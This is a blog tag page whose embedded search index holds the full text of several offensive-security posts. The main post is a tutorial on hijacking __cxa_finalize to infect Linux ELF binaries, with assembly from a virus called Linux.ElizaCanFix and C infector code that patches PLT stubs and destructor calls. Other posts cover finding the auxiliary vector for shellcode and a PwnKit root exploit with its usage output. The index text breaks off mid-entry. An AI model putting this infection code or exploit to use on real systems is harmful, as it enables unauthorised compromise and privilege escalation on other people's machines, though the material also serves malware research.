<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="Infection">

    <link rel="alternate" type="application/rss+xml" href="http://localhost:1313/tags/infection/index.xml" title="vrzh blog" />
    
        <title>Infection | vrzh blog</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.43056c0208714d72a9b07a03fd289886f46955ec4674e0455a120d0d7fd3b4aa.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/posts"><u>P</u>osts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/tags"><u>T</u>ags</a></li>
            
          </ul>
        </nav>
        


<h1>Infection</h1>
<ul class="post-list">
    

    <li>

    <div style="display: grid; grid-template-columns: 7em auto">
      <span class="date">Apr 28, 2024</span>
      
      <a href="/posts/cxa_finalize/">Hijacking __cxa_finalize</a>
      
    </div>

</li>



    
  </ul>


<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/posts\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/posts\/"
    },
    
    "http:\/\/localhost:1313\/": {
        "title": "",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/tags\/__cxa_finalize\/": {
        "title": "__Cxa_finalize",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/__cxa_finalize\/"
    },
    
    "http:\/\/localhost:1313\/posts\/cxa_finalize\/": {
        "title": "Hijacking __cxa_finalize",
        "tags": ["__cxa_finalize","virus","infection","shellcode","linux",],
        "content": " ┌───────────────────────┐ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ │ │ █ █ █ █ █ █ │ │ █ █ █ █ █▀▀▀▀ │ │ █ █ █ █ ▄ │ │ ▄▄▄▄▄ │ │ █ █ │ │ █ █ │ │ █▄▄▄█ │ │ ▄ ▄ │ │ █ █ │ │ █ █ │ │ █▄▄▄█ │ │ ▄▄▄▄▄ │ Hijacking __cxa_finalize to achieve │ █ │ entry point obscuring │ █ │ ~ vrzh └───────────────────█ ──┘\nHijacking the destruction mechanism is an effective entry point obscuring (EPO) virus technique, so long as the delayed execution doesn\u0026rsquo;t impede functionality of the virus or the host. A common example of this technique is patching the the destructor array. In the first tmp.out issue [0], s01den and sblip published their Linux.Eng3ls virus, which used this EPO technique. The virus also uses a number of other cool techniques and I strongly recommend you check it out, as well as s01den\u0026rsquo;s follow-up note on EPO techniques in tmp.out #2 [1]. The C++ ABI spec exposes another, less obvious target for hijacking code execution - __cxa_finalize(). In this txt I\u0026rsquo;m going to describe the purpose of __cxa_finalize(), touch on how it fits in the ELF destruction process, and present two methods of hijacking it.\nTwo pieces of my code supplement this txt: ▪ A virus Linux.ElizaCanFix, which implements Method 0. ▪ An infector [2] written in C, which implements both hijacking methods.\nBoth programs use Silvio Cesare\u0026rsquo;s text segment padding infection [3], but any other infection method can be used. Detailing the infection method is out of the scope of this txt. ╓ ╖ ═╣ What is __cxa_finalize()? ╠═════════════════════════════════════════════════ ╙ ╜ The purpose of __cxa_finalize() function is to run C++ object destructors. It\u0026rsquo;s defined as a part of the the Itanium C++ ABI specification [4], more precisely the Dynamic Shared Object (DSO) destruction at runtime. According to the spec, the DSO object destruction API consists of two components:\n▪ __cxa_atexit()\n┌─┤ glibc ├─────────────────────────────────────────┤ stdlib/cxa_atexit.c ├───┐ │ │ │ int __cxa_atexit (void (*func) (void *), void *arg, void *d) │ └─────────────────────────────────────────────────────────────────────────────┘ __cxa_atexit() registers a destructor routine func with an argument arg for a DSO handle d. A DSO handle is an address in one of the DSO\u0026rsquo;s segments. It can be any address as long as it is unique per-DSO. The linker exposes this handle via a hidden symbol __dso_handle.\n▪ __cxa_finalize()\n┌─┤ glibc ├───────────────────────────────────────┤ stdlib/cxa_finalize.c ├───┐ │ │ │ void __cxa_finalize (void *d) │ └─────────────────────────────────────────────────────────────────────────────┘ __cxa_finalize() calls all destructors for the DSO represented by the handle d in a manner that conforms to the C++ standard (i.e. destructors are called in the order opposite to their registration).\nDespite it appearing in a C++ specification, this mechanism is expected to be implemented for code written in C as well, since C-only Dynamic Shared Objects still have to interact with C++ programs in a spec-conforming manner. The spec also notes that these functions are not be exposed to the programmer directly. In GNU libc atexit(3) is simply a wrapper around __cxa_atexit(), although the only argument exposed to the caller is the function pointer to the destructor.\nItanium ABI is a widely accepted specification and one is likely to find this mechanism in dynamically linked binaries compiled with common frameworks such as gcc and clang. GNU libc, for example, implemented it in the late 90\u0026rsquo;s. Throughout this txt I will be using glibc as the reference libc implementation. ╓ ╖ ═╣ Beginning of the end ╠══════════════════════════════════════════════════════ ╙ ╜ The return value of the main() function is passed to exit(), which in turn is a wrapper around __run_exit_handlers():\n┌─┤ glibc ├──────────────────────┤ sysdeps/generic/libc_start_call_main.h ├───┐ │ │ │ _Noreturn static __always_inline void │ │ __libc_start_call_main (int (*main) (int, char **, │ │ char ** MAIN_AUXVEC_DECL), │ │ int argc, │ │ char **argv MAIN_AUXVEC_DECL) │ │ { │ │ exit (main (argc, argv, __environ MAIN_AUXVEC_PARAM)); │ │ } │ ├─────────────────────────────────────────────────────────┤ stdlib/exit.c ├───┤ │ void │ │ exit (int status) │ │ { │ │ __run_exit_handlers (status, \u0026amp;__exit_funcs, true, true); │ │ } │ │ \u0026hellip; │ │ void │ │ attribute_hidden │ │ __run_exit_handlers (int status, struct exit_function_list *listp, │ │ bool run_list_atexit, bool run_dtors) │ │ { │ │ \u0026hellip; │ │ case ef_cxa: │ │ / To avoid dlclose/exit race calling cxafct twice (BZ 22180), │ │ we must mark this function as ef_free. / │ │ f-\u0026gt;flavor = ef_free; │ │ cxafct = f-\u0026gt;func.cxa.fn; │ │ arg = f-\u0026gt;func.cxa.arg; │ │ PTR_DEMANGLE (cxafct); │ │ │ │ / Unlock the list while we call a foreign function. */ │ │ __libc_lock_unlock (__exit_funcs_lock); │ │ cxafct (arg, status); │ │ __libc_lock_lock (__exit_funcs_lock); │ │ break; │ │ \u0026hellip; │ └─────────────────────────────────────────────────────────────────────────────┘ A function registered with __cxa_atexit() is added to the __exit_funcs list of destructors (struct exit_function_list). In the above code excerpt you can see that it is the same list that is passed to __run_exit_handlers() in exit(). __run_exit_handlers() will cycle through the list, executing destructors according to their flavor. The flavor is used to distinguish how the destructor must be executed, specifically the destructor\u0026rsquo;s prototype and in some cases additional cleanup code. Functions registered with __cxa_atexit() have the ef_cxa flavor and in the above snippet you can see how that case is handled.\nSo wait\u0026hellip; if those destructors are called in __run_exit_handlers(), when does __cxa_finalize() get called?!\nThe System V ABI [5] states that at entry point the rdx register is reserved for a function pointer to be registered with atexit by the program. In the case of a dynamically linked executable, that function is expected to be the program interpreter\u0026rsquo;s destructor. Indeed we can see its registration in libc\u0026rsquo;s init code:\n┌─┤ glibc ├────────────────────────────────────────────┤ csu/libc-start.c ├───┐ │ │ │ /* Register the destructor of the dynamic linker if there is any. / │ │ if (__glibc_likely (rtld_fini != NULL)) │ │ __cxa_atexit ((void () (void *)) rtld_fini, NULL, NULL); │ └─────────────────────────────────────────────────────────────────────────────┘ In glibc\u0026rsquo;s dynamic linker, the destructor is _dl_fini() - here it is passed to to the loaded binary:\n┌─┤ glibc ├─────────────────────────────────┤ sysdeps/x86_64/dl-machine.h ├───┐ │ │ │ # Pass our finalizer function to the user in %rdx, as per ELF ABI.\\n\\ │ │ leaq _dl_fini(%rip), %rdx\\n\\ │ ├─────────────────────────────────────────────────────────┤ elf/dl-fini.c ├───┤ │ void │ │ _dl_fini (void) │ │ { │ │ /* Lots of fun ahead. \u0026hellip; │ └─────────────────────────────────────────────────────────────────────────────┘ To keep it short (trust me you don\u0026rsquo;t want to know what a libc developer thinks is fun) I will note that linker\u0026rsquo;s destructor has many responsibilities, one of which is to call destructors in the fini_array if that mechanism is used (which is true for most modern ELFs). The first entry in this array is normally a pointer to destructor code inserted by the compiler. Here are some examples of such code:\n┌─┤ gcc ├─────────────────────────────────────────────┤ libgcc/crtstuff.c ├───┐ │ │ │ static void attribute((used)) │ │ __do_global_dtors_aux (void) │ │ { │ │ \u0026hellip; │ │ if (__cxa_finalize) │ │ __cxa_finalize (__dso_handle); │ │ │ ├─┤ llvm ├───────────────────────────────┤ compiler-rt/lib/crt/crtbegin.c ├───┤ │ │ │ static void attribute((used)) __do_fini(void) { │ │ \u0026hellip; │ │ │ │ if (__cxa_finalize) │ │ __cxa_finalize (__dso_handle); │ │ │ └─────────────────────────────────────────────────────────────────────────────┘ We have arrived! If __cxa_finalize() function is provided, it will be executed by compiler\u0026rsquo;s destructor code. It\u0026rsquo;s at this point that we are most likely to hijack this function. ╓ ╖ ═╣ Payload Requirements ╠══════════════════════════════════════════════════════ ╙ ╜ This technique mandates a common-sense payload requirement - all non-volatile registers must be preserved. The payload will hand the execution back to the host and if we clobber a used non-volatile register (for example the sole argument to __cxa_finalize() in rdi) we are likely to core. ╓ ╖ ═╣ Method 0: Hijacking at PLT ╠════════════════════════════════════════════════ ╙ ╜ The primary method of hijacking __cxa_finalize() is to find and patch its PLT stub with a jmp to the first parasite instruction. The parasite should end with a jmp to __cxa_finalize(), referenced in GOT. To achieve this, we have to first determine the offset of the __cxa_finalize() GOT entry, then scan the PLT for the right stub. ╭ ╮ ───┤ A note on .plt.got ├────────────────────────────────────────────────────── ╰ ╯ When a stub in .plt is called for the first time, the dynamic linker is invoked to resolve the absolute address of the target function and store it in the GOT for subsequent calls. A stub in .plt.got on the other hand, expects the GOT to already contain the absolute address of the function. Due to this, the .plt.got stubs are only 8 bytes long, as opposed to the 16-byte .plt stubs. Effectively, .plt.got stubs are padded jmp instructions: ┌─────────────────────────────────────────────────────────────────────────────┐ │ Disassembly of section .plt: │ │ │ │ 4090: ff 25 9a ff 01 00 jmp QWORD PTR [rip+0x1ff9a] │ │ 4096: 68 06 00 00 00 push 0x6 │ │ 409b: e9 80 ff ff ff jmp 4020 │ │ │ │ 40a0: ff 25 92 ff 01 00 jmp QWORD PTR [rip+0x1ff92] │ │ 40a6: 68 07 00 00 00 push 0x7 │ │ 40ab: e9 70 ff ff ff jmp 4020 │ │ │ │ Disassembly of section .plt.got: │ │ │ │ 4640: ff 25 52 f9 01 00 jmp QWORD PTR [rip+0x1f952] │ │ 4646: 66 90 xchg ax,ax │ │ │ │ 4648: ff 25 62 f9 01 00 jmp QWORD PTR [rip+0x1f962] │ │ 464e: 66 90 xchg ax,ax │ └─────────────────────────────────────────────────────────────────────────────┘ The stub for __cxa_finalize() is normally found in the .plt.got section. I suspect this is because __cxa_finalize() doesn\u0026rsquo;t benefit from the lazy linking optimization - there isn\u0026rsquo;t a case when it would be linked and not used. ╭ ╮ ───┤ Finding the __cxa_finalize() GOT offset ├───────────────────────────────── ╰ ╯ The offset of the __cxa_finalize() GOT entry is found in a corresponding relocation structure in the .rela.dyn table. To find it we must walk the host\u0026rsquo;s .rela.dyn, looking for the entry with a symbol __cxa_finalize. Again, here we differ from a regular PLT hijack, for which we\u0026rsquo;d be walking the .rela.plt table.\n┌─┤ Linux.ElizaCanFix.asm ├───────────────────────────────────────────────────┐ │ │ │ rela_dyn: │ │ .loop: │ │ mov rcx, [rsp] ; rela iterator │ │ cmp rcx, QWORD [r14 + host_data.rela_dyn_size] │ │ jl .check_entry │ │ ; we couldn\u0026rsquo;t find the rela_dyn entry │ │ add rsp, 8 │ │ jmp fail_infect │ │ │ │ .check_entry: │ │ lea r9, [rbp + rcx] ; current .rela.dyn entry │ │ mov rbx, QWORD [r9 + elf64_rela.r_info] │ │ shr rbx, 32 ; Get the .dynsym table index │ │ │ │ ; calculate the .dynsym table offset │ │ mov rcx, rbx │ │ shl rcx, 4 │ │ shl rbx, 3 │ │ add rbx, rcx │ │ │ │ lea rbx, [r8 + rbx] ; .dynsym entry │ │ mov ebx, DWORD [rbx + elf64_sym.st_name] │ │ mov rdi, [r14 + host_data.dyn_str] │ │ lea rdi, [rdi + rbx] ; symbol string offset in .dynstr │ │ ; compare with \u0026ldquo;__cxa_finalize\u0026rdquo; string │ │ mov rdx, cxa_fin_str_len │ │ lea rsi, [rel cxa_fin_str] │ │ lea r15, [rel _memcmp] │ │ call r15 │ │ test rdi, rdi │ │ jnz .continue │ │ ; we found the __cxa_finalize relocation data │ │ mov r9, [r9 + elf64_rela.r_offset] │ │ lea r9, [rax + r9] ; __cxa_finalize GOT offset │ │ mov [r14 + host_data.cxa_finalize_offt], r9 │ │ jmp .done │ └─────────────────────────────────────────────────────────────────────────────┘ The relocation type should be R_X86_64_GLOB_DAT, which simply indicates that the r_offset field of the relocation entry points directly to the GOT entry. ╭ ╮ ───┤ Finding the __cxa_finalize() stub in .plt.got ├─────────────────────────── ╰ ╯ To find the correct stub, we scan the .plt.got section and check the operand of each jmp instruction. If the operand + address after the jmp equals the GOT entry address we found in the previous step - we\u0026rsquo;ve found the __cxa_finalize() stub.\n┌─┤ Linux.ElizaCanFix.asm ├───────────────────────────────────────────────────┐ │ │ │ plt_got: │ │ .loop: │ │ mov ebx, DWORD [rdx + rcx + 2] ; jmp operand │ │ lea r8, [rdx + rcx + 6] ; address after the jmp │ │ add rbx, r8 ; test offset │ │ cmp rbx, QWORD [r14 + host_data.cxa_finalize_offt] │ │ jne .next │ │ lea rbx, [rdx + rcx] │ │ mov [r14 + host_data.addrof_pltgot_stub], rbx │ │ jmp .done │ │ │ │ .next: │ │ add rcx, 8 ; size of a .plt.got stub │ │ cmp rcx, [r14 + host_data.plt_got_len] │ │ jl .loop │ └─────────────────────────────────────────────────────────────────────────────┘ Now we must calculate the offset to the virus and patch this jmp instruction. Note that in Linux.ElizaCanFix we\u0026rsquo;re jumping within the same segment, so the patch uses a near jmp. If the infection was in a different segment we would instead need a far jmp.\n┌─┤ Linux.ElizaCanFix.asm ├───────────────────────────────────────────────────┐ │ │ │ ; patch the .plt.got stub with a jmp to parasite │ │ mov rbx, [r14 + host_data.addrof_pltgot_stub] │ │ mov BYTE [rbx], 0xe9 ; near jmp opcode │ │ mov rdi, [rsp + 16] ; end of the code segment │ │ lea rsi, [rbx + 5] ; address after near jmp instruction │ │ sub rdi, rsi ; jmp offset to parasite │ │ mov DWORD [rbx + 1], edi │ └─────────────────────────────────────────────────────────────────────────────┘ Finally, we calculate the offset from the end of the infection to the __cxa_finalize() GOT entry and add it as the jmp operand in the virus epilogue.\n┌─┤ Linux.ElizaCanFix.asm ├───────────────────────────────────────────────────┐ │ │ │ ; set up the jump after the virus │ │ add rdi, rdx ; end of the virus │ │ mov WORD [rdi], 0x25ff ; jmp QWORD PTR [rip + ?] │ │ mov rsi, [r14 + host_data.cxa_finalize_offt] │ │ lea rdx, [rdi + 6] ; address after the jmp │ │ sub rsi, rdx ; new jmp offset to __cxa_finalize │ │ mov DWORD [rdi + 2], esi │ └─────────────────────────────────────────────────────────────────────────────┘ This should be it - presuming you\u0026rsquo;ve found a place for your virus, the host should now be infected. ╓ ╖ ═╣ Method 1: Hijacking calls in the destructor ╠═══════════════════════════════ ╙ ╜ Some Linux distributions, such as Arch (I use Arch btw), choose to build binaries with a no-plt optimization. The rationale behind this decision is optimizing for space - with a lot of imports the PLT can really blow up. For those cases, Method 0 obviously won\u0026rsquo;t work. I didn\u0026rsquo;t want to give up on those binaries though and came up with an alternative method. It\u0026rsquo;s a bit wonky, but gets the job done.\nRecall that in both gcc and clang, the default destructor first checks whether __cxa_finalize() is NULL before calling it. This check takes place because the compiler doesn\u0026rsquo;t know whether __cxa_finalize() will be exported by libc or another method will be used to run the destructors. This leaves a predictable pattern in the default destructor, which will allow us to find the hijacking point. The strategy is to scan for a QWORD PTR cmp (48 83 3d), followed a few instructions later by a QWORD PTR call (ff 15), both of which must have the same operand (the other cmp operand is 0). We can then use the call operand to calculate the GOT offset of __cxa_finalize(), patch the call to instead call the virus body, and finally just like in the previous method, simply jmp to the address in the __cxa_finalize() GOT entry.\nFirst though, we need to find the default destructor. As mentioned previously, it is normally the first entry in the fini_array so we get the .fini_array section offset, grab the first pointer, and calculate the file offset:\n┌─┤ infect_cxa_finalize.c ├───────────────────────────────────────────────────┐ │ │ │ static int get_host_sections(struct parasite_host *host) │ │ { │ │ \u0026hellip; │ │ Elf64_Half i; │ │ uint32_t *fini_array; │ │ \u0026hellip; │ │ for (i = 0; i \u0026lt; host-\u0026gt;elf-\u0026gt;e_shnum; i++) { │ │ switch (host-\u0026gt;shdrs[i].sh_type) { │ │ \u0026hellip; │ │ case SHT_FINI_ARRAY: │ │ fini_array = (uint32_t *)((uint64_t)host-\u0026gt;elf + │ │ (uint64_t)host-\u0026gt;shdrs[i].sh_offset); │ │ if (fini_array \u0026amp;\u0026amp; fini_array[0]) { │ │ host-\u0026gt;do_glob_dtors = (uint8_t *)((uint64_t)host-\u0026gt;elf + │ │ (uint64_t)fini_array[0]); │ │ } │ │ break; │ │ \u0026hellip; │ └─────────────────────────────────────────────────────────────────────────────┘ Now it\u0026rsquo;s time to scan it. This method of scanning will work in a pinch, but it\u0026rsquo;s only a PoC. A stray c3 byte (ret) will cause an early loop termination.\n┌─┤ infect_cxa_finalize.c ├───────────────────────────────────────────────────┐ │ │ │ #define RET 0xc3 │ │ const uint8_t qwordcmp[] = { 0x48, 0x83, 0x3d }; │ │ const uint8_t qwordcall[] = { 0xff, 0x15 }; │ │ \u0026hellip; │ │ for (i=0; host-\u0026gt;do_glob_dtors[i+8] != RET; i++) { │ │ if (!memcmp(\u0026amp;host-\u0026gt;do_glob_dtors[i], qwordcmp, 3)) { │ │ saved_offt = *(uint32_t *)\u0026amp;host-\u0026gt;do_glob_dtors[i+3]; │ │ cxafin_got = \u0026amp;host-\u0026gt;do_glob_dtors[i+8] + saved_offt; │ │ DBG(\u0026quot;[DEBUG][CMP] __cxa_finalize\\t@%p\\n\u0026quot;, cxafin_got); │ │ } │ │ │ │ if (!memcmp(\u0026amp;host-\u0026gt;do_glob_dtors[i], qwordcall, 2)) { │ │ saved_offt = *(uint32_t *)\u0026amp;host-\u0026gt;do_glob_dtors[i+2]; │ │ if (cxafin_got == \u0026amp;host-\u0026gt;do_glob_dtors[i+6] + saved_offt) { │ │ DBG(\u0026quot;[DEBUG] Found __cxa_finalize\\t@%p\\n\u0026quot;, cxafin_got); │ │ memcpy(\u0026amp;dtors_epilogue[DTORS_EPILOGUE_JMPOFFT], │ │ \u0026amp;host-\u0026gt;do_glob_dtors[i], 6); │ │ host-\u0026gt;hijack_site = \u0026amp;host-\u0026gt;do_glob_dtors[i]; │ │ return 0; │ │ } │ │ } │ │ } │ └─────────────────────────────────────────────────────────────────────────────┘ At this point we have all we need to finish the hijack. We patch the call site with a call to our virus..\n┌─┤ infect_cxa_finalize.c ├───────────────────────────────────────────────────┐ │ │ │ uint8_t call[6] = { │ │ 0xe8, 0x00, 0x00, 0x00, 0x00, // call ? │ │ 0x90 // nop │ │ }; │ │ │ │ uint32_t *call_operand = (uint32_t *)\u0026amp;call[1]; │ │ \u0026hellip; │ │ *call_operand = virus_offt; │ │ memcpy(host-\u0026gt;hijack_site, call, 6); │ │ \u0026hellip; │ └─────────────────────────────────────────────────────────────────────────────┘ .. and set the address of the __cxa_finalize() GOT entry as the jmp operand in the virus epilogue. The calculation for this jmp is exactly the same as in the previous method.\nSome of you might notice that we are replacing a far call with a near call - operations that differ in length. The purpose of the additional nop (90) instruction in the call[] array is to align with the surrounding destructor code and make sure __cxa_finalize() returns to a valid instruction. Again, this might not be necessary if your parasite lives in a different segment.\nThis method isn\u0026rsquo;t strictly limited to hijacking __cxa_finalize() - it can be adapted to hijack any call that can be found and reached with a predictable code pattern. ╓ ╖ ═╣ Disadvantages ╠═════════════════════════════════════════════════════════════ ╙ ╜ ▪ This hijacking method is only applicable to dynamically linked executables.\n▪ If the binary can circumvent the destruction mechanism (e.g. through an exit syscall or calls to quick_exit()/_Exit()) the virus will not be reached.\n▪ __cxa_finalize() might be called more than once per-execution, so if you take the PLT hijacking route (Method 0) your parasite may be called again. ╓ ╖ ═╣ References ╠════════════════════════════════════════════════════════════════ ╙ ╜ [0] Lin64.Eng3ls: Some anti-RE techniques in a Linux virus [https://tmpout.sh/1/7.html] [1] A short note on entrypoint obscuring in ELF binaries [https://tmpout.sh/2/2.html] [2] [https://github.com/v-rzh/cxa-finalize-infect.git] [3] [https://web.archive.org/web/20210420163849/https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix01.htm#11] [4] Itanium C++ ABI. [https://itanium-cxx-abi.github.io/cxx-abi/] [5] System V Application Binary Interface AMD64 Architecture Processor Supplement (29-30) [https://refspecs.linuxbase.org/elf/x86_64-abi-0.99.pdf]\n", 
        "url": "http:\/\/localhost:1313\/posts\/cxa_finalize\/"
    },
    
    "http:\/\/localhost:1313\/tags\/infection\/": {
        "title": "Infection",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/infection\/"
    },
    
    "http:\/\/localhost:1313\/tags\/linux\/": {
        "title": "Linux",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/linux\/"
    },
    
    "http:\/\/localhost:1313\/tags\/shellcode\/": {
        "title": "Shellcode",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/shellcode\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
    "http:\/\/localhost:1313\/tags\/virus\/": {
        "title": "Virus",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/virus\/"
    },
    
    "http:\/\/localhost:1313\/tags\/auxiliary-vector\/": {
        "title": "Auxiliary Vector",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/auxiliary-vector\/"
    },
    
    "http:\/\/localhost:1313\/posts\/auxvector\/": {
        "title": "In search of the auxiliary vector",
        "tags": ["auxiliary vector","virus","shellcode","linux",],
        "content": "This article and supporting repository present a naive but effective method of scanning the stack for the auxiliary vector.\nBackground The order of first several auxiliary vector entries as defined in the linux kernel source (create_elf_tables() in fs/binfmt_fs.c) has not changed since v2.6.12 (3a93e40326c8f470e71d20b4c42d36767450f38f last time I checked):\nNEW_AUX_ENT(AT_HWCAP, ELF_HWCAP); NEW_AUX_ENT(AT_PAGESZ, ELF_EXEC_PAGESIZE); NEW_AUX_ENT(AT_CLKTCK, CLOCKS_PER_SEC); NEW_AUX_ENT(AT_PHDR, phdr_addr); NEW_AUX_ENT(AT_PHENT, sizeof(struct elf_phdr)); NEW_AUX_ENT(AT_PHNUM, exec-\u0026gt;e_phnum); NEW_AUX_ENT(AT_BASE, interp_load_addr); if (bprm-\u0026gt;interp_flags \u0026amp; BINPRM_FLAGS_PRESERVE_ARGV0) flags |= AT_FLAGS_PRESERVE_ARGV0; NEW_AUX_ENT(AT_FLAGS, flags); NEW_AUX_ENT(AT_ENTRY, e_entry); NEW_AUX_ENT(AT_UID, from_kuid_munged(cred-\u0026gt;user_ns, cred-\u0026gt;uid)); NEW_AUX_ENT(AT_EUID, from_kuid_munged(cred-\u0026gt;user_ns, cred-\u0026gt;euid)); NEW_AUX_ENT(AT_GID, from_kgid_munged(cred-\u0026gt;user_ns, cred-\u0026gt;gid)); NEW_AUX_ENT(AT_EGID, from_kgid_munged(cred-\u0026gt;user_ns, cred-\u0026gt;egid)); NEW_AUX_ENT(AT_SECURE, bprm-\u0026gt;secureexec); That means that a predictable order of struct aux_entry_64 id values can be found somewhere on the stack. This pattern likely marks the beginning of the auxiliary vector.\nWhy not use getauxval() like a normal person? The point of this code is to be able to find the auxiliary vector without depending on libc or knowing the stack state. This can be useful as part of elf parasite code or shellcode.\nUsage ASM Implementation Run make and you can link the auxvector64.o with your program. For a 32-bit object run make 32bit=true (it will produce auxvector32.o).\nThe asm version doesn\u0026rsquo;t take any arguments and returns the address of the auxiliary vector in rax (or eax in the 32 bit version).\nC Implementation Run make c=true and you can link the auxvector.o with your program. For a 32-bit object run make c=true 32bit=true.\nCall get_beg_auxvector() from your code:\nstruct aux_entry *get_beg_auxvector(unsigned long int rsp, unsigned long int max_stack); rsp and max_stack represent the lower and upper bound of the stack scan respectively. Both addresses will be QWORD/DWORD aligned (depending on bitness).\nThe function returns a pointer to AT_HWCAP auxiliary vector entry or NULL on error.\nExamples Check out code in test32.asm and test64.asm for an example.\nYou can compile and link these examples with make test 32bit=true and make test respectively.\nBoth examples will grab the AT_PHNUM value and pass it to the exit syscall.\n[ab@gibson]$ make test c=true nasm -o test64.o test64.asm -felf64 gcc -o auxvector.o auxvector.c -c -Wall -nostdlib -pie -fpic -O3 -D__WORDSIZE=64 ld -o test.elf test64.o auxvector.o ... [ab@gibson]$ strace ./test.elf execve(\u0026#34;./test.elf\u0026#34;, [\u0026#34;./test.elf\u0026#34;], 0x7ffff5364500 /* 46 vars */) = 0 exit(5) = ? +++ exited with 0 +++ ", 
        "url": "http:\/\/localhost:1313\/posts\/auxvector\/"
    },
    
    "http:\/\/localhost:1313\/posts\/pwnkit\/": {
        "title": "CVE-2021-4034 Exploit",
        "tags": ["PwnKit","exploit","libc","polkit","LPE","linux",],
        "content": "Root exploit for the PwnKit vulnerability. Check out the original report here .\nUse this exploit with an express permission of the target system owners.\nBuilding No dependencies needed besides libc. Just run make.\nRunning Running without options will execute the exploit:\n[linux@linux ~]$ ./exploit ----------------------------------------------------------------------------- __\\ / __ __ _ __ _ __ | \\ / _ ___ / V |_ --- _)/ \\ _)/| ---|_|/ \\__)|_| | V |_) _/|_| \\__ |__ /__\\_//__ | |\\_/__) | | | \\/__| | ----------------------------------------------------------------------------- sh-5.1# whoami root sh-5.1# You can customize the path to pkexec as well as the \u0026ldquo;from\u0026rdquo; charset:\n[linux@linux ~]$ ./exploit -h ... ./exploit [-c] [-h] [-f from_charset] [-p /path/to/pkexec] ----------------------------------------------------------------------------- -c Just teardown - don\u0026#39;t exploit -p \u0026lt;path\u0026gt; Path to pkexec (default: \u0026#34;/usr/bin/pkexec\u0026#34;) -f \u0026lt;from_charset\u0026gt; Custom \u0026#34;from\u0026#34; charset (default: 